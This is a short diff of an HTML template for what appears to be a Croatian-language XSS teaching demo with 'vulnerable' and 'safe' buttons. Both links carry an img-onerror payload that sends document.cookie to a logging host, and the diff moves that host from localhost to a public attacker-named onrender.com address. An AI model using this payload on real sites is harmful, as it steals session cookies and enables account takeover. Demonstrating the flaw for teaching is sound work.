@@ -69,8 +69,8 @@ HOME_HTML = """
   <div class="card">
     <h1>Demo za XSS</h1>
     <p><b>Odaberite jednu od opcija:</b></p>
-    <a class="btn" style="background:#dc2626" href='/nesigurno?ime=<img src=x onerror="new Image().src=%27http://localhost:9000/log?c=%27%2Bdocument.cookie">'>RANJIVO (XSS)</a>
-<a class="btn" style="background:#16a34a" href='/sigurno?ime=<img src=x onerror="new Image().src=%27http://localhost:9000/log?c=%27%2Bdocument.cookie">'>SIGURNO (bez XSS)</a>
+    <a class="btn" style="background:#dc2626" href='/nesigurno?ime=<img src=x onerror="new Image().src=%27https://drugi-projekt-security-napadac.onrender.com/log?c=%27%2Bdocument.cookie">'>RANJIVO (XSS)</a>
+<a class="btn" style="background:#16a34a" href='/sigurno?ime=<img src=x onerror="new Image().src=%27https://drugi-projekt-security-napadac.onrender.com/log?c=%27%2Bdocument.cookie">'>SIGURNO (bez XSS)</a>
   </div>
 </body></html>
 """
